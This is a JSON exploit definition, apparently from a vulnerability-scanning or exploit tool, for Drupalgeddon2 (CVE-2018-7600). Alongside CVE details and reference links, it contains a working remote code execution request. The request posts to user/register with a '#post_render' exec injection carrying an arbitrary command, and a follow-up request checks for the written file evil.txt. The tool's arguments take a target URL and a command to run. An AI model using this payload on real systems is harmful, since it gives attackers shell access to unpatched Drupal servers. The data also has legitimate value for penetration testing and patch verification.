{"CVSS":"CVSS 7.5","name":"CVE-2018-7600","CWE":"CWE-20","usage":" --url URL --command COMMAND","author":"Jos√© Ignacio Rojo","paths":["'user/register?element_parents=account/mail/%23value&amp","'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax","/default/&quot","/default/files/&quot","\"user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax","\"user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax","\"file/ajax/name/%23value/","\"core/CHANGELOG.txt","\"includes/bootstrap.inc","\"core/includes/bootstrap.inc","/default/","/default/files/"],"requests":{"request_2":{"path":"evil.txt","method":"GET","validation":{"TSTRING":["h3ll"]},"query":"","headers":{"Content-Type":"application/x-www-form-urlencoded","Accept-Encoding":"gzip, deflate, compress","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}},"request_1":{"headers":{"Content-Type":"application/x-www-form-urlencoded","Accept-Encoding":"gzip, deflate, compress","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},"method":"POST","validation":{"TSTRING":["h3ll"]},"query":"element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax","data":"form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=$command","path":"user/register"}},"title":"Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)","keywords":["Drupal","8.3.9","/","8.4.6","8.5.1","Drupalgeddon2","Remote","Code","Execution","PoC","PHP","webapps","CVE-2018-7600","7.58","Metasploit","remote","Metasploit Framework (MSF)"],"platform":"PHP","references":["https://www.exploit-db.com/search/?action=search&cve=2018-7600","https://nvd.nist.gov/vuln/detail/CVE-2018-7600","https://www.cvedetails.com/cve/CVE-2018-7600/","Nessus Plugins","First CVSS Guide","https://www.synology.com/support/security/Synology_SA_18_17","http://www.securitytracker.com/id/1040598","https://www.tenable.com/blog/critical-drupal-core-vulnerability-what-you-need-to-know","https://greysec.net/showthread.php?tid=2912&amp;pid=10561","https://groups.drupal.org/security/faq-2018-002","https://lists.debian.org/debian-lts-announce/2018/03/msg00028.html","https://research.checkpoint.com/uncovering-drupalgeddon-2/","https://www.exploit-db.com/exploits/44449/","https://www.exploit-db.com/exploits/44482/","https://github.com/g0rx/CVE-2018-7600-Drupal-RCE","https://blog.appsecco.com/remote-code-execution-with-drupal-core-sa-core-2018-002-95e6ecc0c714","https://www.drupal.org/sa-core-2018-002","https://www.debian.org/security/2018/dsa-4156","http://www.securityfocus.com/bid/103534","https://github.com/a2u/CVE-2018-7600","https://twitter.com/RicterZ/status/979567469726613504","https://twitter.com/RicterZ/status/984495201354854401","https://twitter.com/arancaytar/status/979090719003627521","https://www.exploit-db.com/exploits/44448/","https://badpackets.net/over-100000-drupal-websites-vulnerable-to-drupalgeddon-2-cve-2018-7600/","http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600","http://cve.scap.org.cn/CVE-2018-7600.html","https://exploit-db.com/exploits/44448/","https://exploit-db.com/raw/44448/","https://exploit-db.com/exploits/44449/","https://exploit-db.com/raw/44449/","https://exploit-db.com/exploits/44482/","https://exploit-db.com/raw/44482/"],"exploit_header":"    print \" \"x16 . \" ____     __  __  ____                 ___       __      _     __             ________   ____     __      __     \\n\";\n    print \" \"x16 . \"/\\\\  _`\\\\  /\\\\ \\\\/\\\\ \\\\/\\\\  _`\\\\             /'___`\\\\   /'__`\\\\  /' \\\\  /'_ `\\\\          /\\\\_____  \\\\ /'___\\\\  /'__`\\\\  /'__`\\\\   \\n\";\n    print \" \"x16 . \"\\\\ \\\\ \\\\/\\\\_\\\\\\\\ \\\\ \\\\ \\\\ \\\\ \\\\ \\\\L\\\\_\\\\          /\\\\_\\\\ /\\\\ \\\\ /\\\\ \\\\/\\\\ \\\\/\\\\_, \\\\/\\\\ \\\\L\\\\ \\\\         \\\\/___//'/'/\\\\ \\\\__/ /\\\\ \\\\/\\\\ \\\\/\\\\ \\\\/\\\\ \\\\  \\n\";\n    print \" \"x16 . \" \\\\ \\\\ \\\\/_/_\\\\ \\\\ \\\\ \\\\ \\\\ \\\\  _\\\\L   _______\\\\/_/// /__\\\\ \\\\ \\\\ \\\\ \\\\/_/\\\\ \\\\/_> _ <_  _______   /' /' \\\\ \\\\  _``\\\\ \\\\ \\\\ \\\\ \\\\ \\\\ \\\\ \\\\ \\\\ \\n\";\n    print \" \"x16 . \"  \\\\ \\\\ \\\\L\\\\ \\\\\\\\ \\\\ \\\\_/ \\\\ \\\\ \\\\L\\\\ \\\\/\\\\______\\\\  // /_\\\\ \\\\\\\\ \\\\ \\\\_\\\\ \\\\ \\\\ \\\\ \\\\/\\\\ \\\\L\\\\ \\\\/\\\\______\\\\/' /'    \\\\ \\\\ \\\\L\\\\ \\\\ \\\\ \\\\_\\\\ \\\\ \\\\ \\\\_\\\\ \\\\\\n\";\n    print \" \"x16 . \"   \\\\ \\\\____/ \\\\ `\\\\___/\\\\ \\\\____/\\\\/______/ /\\\\______/ \\\\ \\\\____/  \\\\ \\\\_\\\\ \\\\____/\\\\/______/\\\\_/       \\\\ \\\\____/\\\\ \\\\____/\\\\ \\\\____/\\n\";\n    print \" \"x16 . \"    \\\\/___/   `\\\\/__/  \\\\/___/           \\\\/_____/   \\\\/___/    \\\\/_/\\\\/___/         \\\\//         \\\\/___/  \\\\/___/  \\\\/___/ \\n\";\n    print \" \"x16 . \"                                                                                                                 \\n\";\n    print \" \"x16 . \"                                                                                                                 \\n\";\n","SA-CORE":"2018-002-95","escaped_name":"CVE-2018-7600","versions":["8.3.9","8.4.6","8.5.1","7.58"],"date":"2018-04-17","arguments":{"proxy":{"description":"Proxy Server To Use [Format: scheme://host:port]","type":"s","name":"proxy","variable":"proxy"},"Help":{},"useragent":{"name":"user-agent","type":"s","variable":"useragent","description":"User-Agent To Send To Server","variable_value":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0"},"debug":{"type":"g","variable":"DEBUG","name":"debug","description":"Debug Mode"},"DEBUG":{},"auth":{"description":"Credentials To Use For HTTP Login [Format: username:password]","name":"auth","type":"s","variable":"auth"},"timeout":{"variable_value":"30","type":"i","name":"timeout","variable":"timeout","description":"Max Timeout For The HTTP Requests"},"cookie_string":{"name":"cookie","type":"s","variable":"cookie_string","description":"Cookie String To Use"},"VERBOSE":{},"url":{"type":"s","name":"url","variable":"url","description":"The Target URL [Format: scheme://host]"},"command":{"variable_value":"echo \"h3ll\" | tee evil.txt","description":"The command to execute .","type":"s","name":"command","variable":"command"},"verbose":{"type":"g","variable":"VERBOSE","name":"verbose","description":"Be More Verbose"},"help":{"description":"Display The Help Menu","type":"f","name":"help","variable":"Help"}},"description":"\nDrupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x\nbefore 8.5.1 allows remote attackers to execute arbitrary code because\nof an issue affecting multiple subsystems with default or common module\nconfigurations.\n","exploits":{"33706":{"url":"https://www.exploit-db.com/download/33706.txt","type":"txt","EDB-ID":"33706"},"35415":{"url":"https://www.exploit-db.com/download/35415.txt","type":"txt","EDB-ID":"35415"},"40144":{"url":"https://www.exploit-db.com/download/40144.php","type":"php","EDB-ID":"40144"},"25493":{"type":"txt","url":"https://www.exploit-db.com/download/25493.txt","EDB-ID":"25493"},"4510":{"type":"txt","url":"https://www.exploit-db.com/download/4510.txt","EDB-ID":"4510"},"35397":{"url":"https://www.exploit-db.com/download/35397.txt","type":"txt","EDB-ID":"35397"},"10826":{"url":"https://www.exploit-db.com/download/10826.sh","type":"sh","EDB-ID":"10826"},"44482":{"url":"https://www.exploit-db.com/download/44482.rb","type":"rb","EDB-ID":"44482"},"18389":{"EDB-ID":"18389","url":"https://www.exploit-db.com/download/18389.txt","type":"txt"},"37453":{"url":"https://www.exploit-db.com/download/37453.php","type":"php","EDB-ID":"37453"},"40130":{"EDB-ID":"40130","type":"rb","url":"https://www.exploit-db.com/download/40130.rb"},"35072":{"url":"https://www.exploit-db.com/download/35072.txt","type":"txt","EDB-ID":"35072"},"40149":{"EDB-ID":"40149","url":"https://www.exploit-db.com/download/40149.rb","type":"rb"},"22940":{"type":"txt","url":"https://www.exploit-db.com/download/22940.txt","EDB-ID":"22940"},"3312":{"type":"pl","url":"https://www.exploit-db.com/download/3312.pl","EDB-ID":"3312"},"44448":{"type":"py","url":"https://www.exploit-db.com/download/44448.py","EDB-ID":"44448"},"44542":{"EDB-ID":"44542","url":"https://www.exploit-db.com/download/44542.txt","type":"txt"},"27020":{"url":"https://www.exploit-db.com/download/27020.txt","type":"txt","EDB-ID":"27020"},"44449":{"EDB-ID":"44449","url":"https://www.exploit-db.com/download/44449.rb","type":"rb"},"11060":{"url":"https://www.exploit-db.com/download/11060.txt","type":"txt","EDB-ID":"11060"},"41564":{"EDB-ID":"41564","url":"https://www.exploit-db.com/download/41564.php","type":"php"},"18564":{"url":"https://www.exploit-db.com/download/18564.txt","type":"txt","EDB-ID":"18564"},"44557":{"EDB-ID":"44557","url":"https://www.exploit-db.com/download/44557.rb","type":"rb"},"3313":{"url":"https://www.exploit-db.com/download/3313.pl","type":"pl","EDB-ID":"3313"},"35335":{"type":"html","url":"https://www.exploit-db.com/download/35335.html","EDB-ID":"35335"},"1088":{"url":"https://www.exploit-db.com/download/1088.pl","type":"pl","EDB-ID":"1088"}},"vulnerable_apps":["https://www.exploit-db.com/apps/5679d3fa188fb80368ee46ab40acdb6b-drupal-8.5.0.tar.gz","https://www.exploit-db.com/apps/5679d3fa188fb80368ee46ab40acdb6b-drupal-8.5.0.tar.gz","https://www.exploit-db.com/apps/5679d3fa188fb80368ee46ab40acdb6b-drupal-8.5.0.tar.gz"],"help":"\n            --url [VALUE]\t: The Target URL [Format: scheme://host]\n            --user-agent [VALUE]\t: User-Agent To Send To Server\n            --cookie [VALUE]\t: Cookie String To Use\n            --proxy [VALUE]\t: Proxy Server To Use [Format: scheme://host:port]\n            --timeout [VALUE]\t: Max Timeout For The HTTP Requests\n            --auth [VALUE]\t: Credentials To Use For HTTP Login [Format: username:password]\n            --help               : Display The Help Menu\n            --verbose               : Be More Verbose\n            --debug               : Debug Mode\n            --command [VALUE]\t: The command to execute .","EXPLOITDB":"44482","required_arguments":"!$url || !$command","CVE":"CVE-2018-7600"}